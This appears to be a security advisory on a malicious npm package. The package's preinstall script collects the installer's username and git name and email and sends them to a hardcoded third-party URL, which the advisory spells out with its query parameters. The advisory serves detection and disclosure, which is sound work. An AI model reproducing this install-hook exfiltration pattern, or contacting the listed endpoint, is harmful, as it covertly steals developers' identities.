summary: preinstall script exfiltrates installer's username and git identity to third-party host
details: The package declares `preinstall: node./dist/scripts/preinstall.js` in package.json. At npm install time, that script reads `os.userInfo().username` and parses the installer's `~/.gitconfig` for `user.name` and `user.email`, then issues `https.get()` to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<username>&gitname=<git name>&gitemail=<git email>`. The destination host is unrelated to the package's publisher and is contacted unconditionally on every install. This is an installer-side data exfiltration channel firing during a lifecycle hook — the canonical active-attack shape. Three independent signals corroborate: filesystem+network pairing in preinstall, hardcoded non-publisher C2 endpoint, and system-info collection (username + gitconfig identity) piped directly to that endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
